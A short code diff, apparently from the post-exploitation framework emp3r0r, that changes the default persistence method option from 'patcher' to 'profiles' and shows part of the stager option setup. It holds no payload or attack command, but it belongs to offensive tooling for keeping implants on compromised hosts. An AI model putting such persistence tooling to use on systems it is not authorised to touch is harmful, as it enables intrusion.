@@ -184,7 +184,7 @@ func UpdateOptions(modName string) (exist bool) {
 		for k := range emp3r0r_data.PersistMethods {
 			currentOpt.Vals = append(currentOpt.Vals, k)
 		}
-		currentOpt.Val = "patcher"
+		currentOpt.Val = "profiles"
 
 	case modName == emp3r0r_data.ModStager:
 		stager_type_opt := addIfNotFound("type")
